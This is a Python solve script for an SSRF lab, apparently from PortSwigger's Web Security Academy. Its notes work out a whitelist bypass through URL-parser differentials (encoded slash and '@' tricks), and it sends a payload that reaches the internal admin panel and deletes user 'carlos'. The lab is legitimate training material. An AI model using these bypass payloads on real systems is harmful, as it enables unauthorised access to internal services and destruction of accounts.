'''
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass.
'''

import requests

def main():
  proxies = {
      'http': '127.0.0.1:8080',
      'https': '127.0.0.1:8080'
  }
  
  s = requests.Session()
  s.proxies.update(proxies)
  s.verify = False

  url = "https://0a2b005d037cf1fa803e53b3009c00ac.web-security-academy.net"

  """
  After much experimentation of adding . @ # and reordering the positioning of target url and whitelist,
  the SSRF poc to access admin panel is stockApi=http%3a//localhost%252f%40stock.weliketoshop.net%3a8080/admin
  http://localhost%252f@stock.weliketoshop.net:8080/admin

  Seems like there is a parser differential of how the backend services handle stockApi. Refer to OrangeTsai make ssrf great again talk

  The first parsing layer most probably checks host defined after the '@' user credential delimiter, in this case stock.weliketoshop.net:8080
  The request is most probably handled by another http library that will validate the host in the http request sent by first parsing library

  If our payload is http://localhost@stock.weliketoshop.net:8080, then
  first parser will take the host to be weliketoshop.net:8080
  second parser will take the host to be stock.weliketoshop.net:8080

  But if we add a `/` after localhost? Will the second parser consider the path of localhost to be /@stock.weliketoshop.net:8080?
  Based on the behaviour, it seems to be the case

  We will need to URL encode our / for each layer the request is sent internally as the request library will automatically decode onetime per request handle
  In this case, we double url encode / to %252f

  If our payload is http://localhost%252f@stock.weliketoshop.net:8080, then
  first parser will take the host to be weliketoshop.net:8080
  second parser will take the host to be localhost and the path to be /@stock.weliketoshop.net:8080
  
  Note that, this payload will return the same shop page but this time we see the internal page to be /admin
  
  We can try to access the admin panel via stockApi=http://localhost%252fadmin%252f@stock.weliketoshop.net:8080
  but it will not work.

  Instead the following will work
  stockApi=http://localhost%252f@stock.weliketoshop.net:8080/admin

  I thought that this behaviour raises some question to our initial hypothesis of second parser ignoring what comes after / path delimiter
  But my assumption is that the whitelist mechanism is based on host. The backend implmentation most probably extracted the host from the request object
  and then check against a whitelist.

  Since we have stockApi=http://localhost%252f@stock.weliketoshop.net:8080/admin, my asssumption is the following:
  first parser will take the host to be weliketoshop.net:8080 and check against a whitelist
  second parser will take the host to be localhost and the path to be /admin and not /@stock.weliketoshop.net:8080/admin which was from initial hyptothesis

  Maybe the first request handler sees the path as /admin and forwards the request to second handler. From there, the second handler will take the host to be localhost/ and the path to be /admin as specified by the first handler.

  On hindsight, it seems like using a fragment delimiter # works too instead of /. I guess as long as we can get the second parser
  to ignore the stock.weliketoshop.net:8080
  """

  payload = {
    "stockApi": "http://localhost%2f@stock.weliketoshop.net:8080/admin/delete?username=carlos"
  }

  s.post(f"{url}/product/stock", data=payload)


if __name__ == "__main__":
  main()